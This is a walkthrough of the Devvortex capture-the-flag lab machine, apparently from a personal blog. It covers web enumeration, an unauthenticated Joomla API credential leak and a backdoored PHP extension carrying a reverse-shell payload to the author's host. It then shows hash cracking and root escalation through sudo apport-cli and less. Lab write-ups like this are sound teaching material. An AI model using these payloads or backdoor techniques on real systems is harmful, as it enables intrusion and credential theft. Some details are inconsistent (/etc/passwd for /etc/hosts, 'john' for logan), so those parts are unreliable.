---
tags:
  - Linux
  - HTTP
  - CVE
  - PHP
  - Sudoers
---

... is an easy HTB machine which demands high `http` reconnaissance to find a hidden endpoint on an alternative virtual host. There, a vulnerable version of `Joomla` is running, which allows you to call `apis` without prior authentication. One of them reveals credentials to access the back-end, where custom extensions (`PHP` code) can be uploaded and executed, resulting in RCE. For privilege escalation, the system user is allowed to execute a binary as `root`, which eventually calls the binary `less`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This is a very typical setup of a web-vulnerability type CTF, where the `http` allows you to execute remote code on the machine, to allow you to find credentials for `ssh`. The output of the `http-title` `nmap` script tells us that the domain name `devvortex.htb` is present. To quickly edit the `/etc/hosts` file for local DNS name resolution without a public DNS server, the following command appends an entry to that file:
```bash
echo "$IP devvortex.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

After visiting `http://devvortex.htb`, i see a home-page for a web-development agency. The `view-source` of the landing page reveals the following endpoints after filtering for them:

- `about.html`
- `do.html`
- `portfolio.html`
- `contact.html`

Almost all of these endpoints seem to serve static data. Only the `/contact.html` offers an contact form which i can interact with. The developer tools of the browser do not show anything interesting.

To find more endpoints that may be hidden in the `view-source`, i use `ffuf` to employ forceful browsing using this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://devvortex.htb/FUZZ.html" -fs 162 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 162 are "404" errors.
# -mc: accept any response code
```

This has revealed nothing new, not even with the word-list `big.txt`.

Due to this, i decided to also do some `VHost` fuzzing using the `subdomains-top1million-5000.txt` from `SecLists` (for a more in-depth explanation, see my write-up on the `Three` challenge!):
```bash
ffuf -w ./subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.devvortex.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
# -mc: accept any response code
```

This did find the additional VHost `dev.devvortex.htb`! I also add this domain to the `/etc/passwd` file using this command:
```bash
sudo sed -i "s/$IP devvortex.htb/$IP devvortex.htb dev.devvortex.htb/" /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: required, as we are editing /etc/hosts
# -i: edit the file in-place and overwrite it
# "s/old_word/new_word/": replaces each occurance of old_word with new_word
# /etc/hosts: file we want to edit
```

This new sub-domain displays an alternative home-page of the previous domain. A `href` in the `view-source` reveals `/portfolio-details.html`. Visiting that endpoint, redirects me to the home page, which is `index.php`!
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://dev.devvortex.htb/FUZZ.php" -fs 16 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 162 are "404" errors.
# -mc: accept any response code
```

This has revealed the `configuration.php`, but it does not return anything. I tried this exact scan again, but without the `.php` file ending and it revealed an interesting endpoint `/robots.txt` (a file which disallows google crawler bots to visit those endpoints). This is the content of the `robots.txt`:
```html
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
The `/administrator` endpoints reveals an `Joomla Administrator Login`!

### Initial Exploitation
I wanted to find out what version of `Joomla` is running. A google query leads me to this [joomla stackexchange](https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http) where i find out, that this endpoint:
```http
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```
gives me the version! It is `4.2.6`. Searching for `Joomla 4.2.6` vulnerabilities, i find out that there are improper access controls in place to check if the user is authenticated when requesting internal APIs! The following API's are very interesting:

- `/api/index.php/v1/users?public=true`: Shows me information about the users, which are `lewis` (`Super User`) and `logan`(`Registered`).
- `/api/index.php/v1/config/application?public=true`: Shows the configuration of the web application. It reveals the following info about the database:

```json
{
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    }
```
I can use the credentials `lewis:P4ntherg0t1n5r3c0n##` to log in to the `Joomla` admin back-end!

I review the back-end to find two very interesting functionalities in the `Tab` `System`. `Joomla` allows you to use `Extensions` and `Plugins`. The `Extensions` tab also reveals a button `Install Extensions`, which allows me to upload my own extension! I search for a free and simple `Joomla` extension and i decided to download [this](https://www.hotjoomlatemplates.com/free-joomla-extensions/757-elastic-slider) one, but it can be any one. I unzip it, select any `php` file (in my case, `mod_hot_elastic_slider/mod_hot_elastic_slider.php`) and add this single line to it:
```php
system('ping -c 3 <my-IP>');
```
This lets the extension be used as it is intended (sneaky...), with the added feature that it executes my OS-command which i select (here, a ping to verify that the execution works!). I `zip -r test.zip mod_hot_elastic_slider` my custom extension, and upload it. 

I start listening for `ICMP` packets like this:
```bash
sudo tcpdump -i tun0 icmp
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: is required for packet inspection
# -i: specify the interface. the HTB VPN uses tun0
# icmp: listen for Internet Control Message Protocol (in short, ping) messages
```

and visit: `http://dev.devvortex.htb/modules/mod_hot_elastic_slider/mod_hot_elastic_slider.php`, which makes me receive pings!

I quickly change the `ping` payload to a reverse shell initiator:
```php
system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"');
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# bash -c: wraps the following command so that it explicitly gets executed by bash, not the current shell
# /bin/bash -i: launch the bash binary in interactive mode
# >&: redirect standard output and standard error to:
# /dev/tcp/<IP>/port: when the bash binary opens this path, it creates a TCP connection!
# 0>&1: STDIN (0) gets redirected (>) to where STDOUT (1) is pointing
```

I delete the old extension, `zip` the new and improved one, upload it and start a `nc` listener:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

Rendering `/modules/mod_hot_elastic_slider/mod_hot_elastic_slider.php` gives me a reverse shell as `www-data`!

### Lateral Movement
As the user `www-data` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `logan` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

I use `cd` with no arguments, as that always puts you in the home directory of the current user (which is `/var/www` for `www-data`). As the `/api/index.php/v1/config/application?public=true` has revealed that a `mysqli` service is running on `localhost`, i enumerate the database using these commands:
```bash
mysql -u lewis -p -e "show databases"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here lewis
# -p: use password
# -e: execute the following query. it lists the datbases.
```

After finding out that the database's name is `joomla`, i execute the following command to show me the tables of that database:
```bash
mysql -u lewis -p joomla -e "show tables"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here lewis
# -p: use password
# joomla: equivalent of "use joomla" before query
# -e: execute the following query. it lists the tables.
```

And lastly, i list all entries of the identified `users` table using this command:
```bash
mysql -u lewis -p joomla -e "select * from sd4fg_users;"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here lewis
# -p: use password
# joomla: equivalent of "use joomla" before query
# -e: execute the following query. it fetches all entries of the table `sd4fg_users`
```

This gives me the password-hash of `lewis` and `logan`. As `logan` is a system user with a `/home` directory, i save his hash in a `hash.txt`. I use `hashcat ./hash.txt` to try and identify it's mode. It gave me a few options, which i didn't want to all try, so i verify what hash it is using the `CLI` tool `hashid`:
```bash
hashid hash.txt
```
It turns out that it is `Blowfish(OpenBSD)`, which equates to mode `3200` in `hashcat`. The full command for obtaining the clear-text password is:
```bash
hashcat -m 3200 ./hash.txt ./rockyou.txt
```
I then use `ssh john@$IP` with the password `tequieromucho` to log into the machine, and i read the `user.txt` flag.

### Privilege Escalation
I try the usual suspects of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

I find out that `logan` can execute `apport-cli` as `root`. [GTFOBins](https://gtfobins.org/gtfobins/apport-cli/) reveals that the usage of `apport-cli` can result in the usage of the binary `less`, when using this combination of options:
```bash
sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?
# ...
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1
# ...
*** What display problem do you observe?
# ...
Please choose (1/2/3/4/5/6/7/8/C): 2
# ...
*** Send problem report to the developers?
# ...
Please choose (S/V/K/I/C): v
```

When in the `less` command, you can simply type `!/bin/bash` to receive a bash environment as the user which started this command (`root`).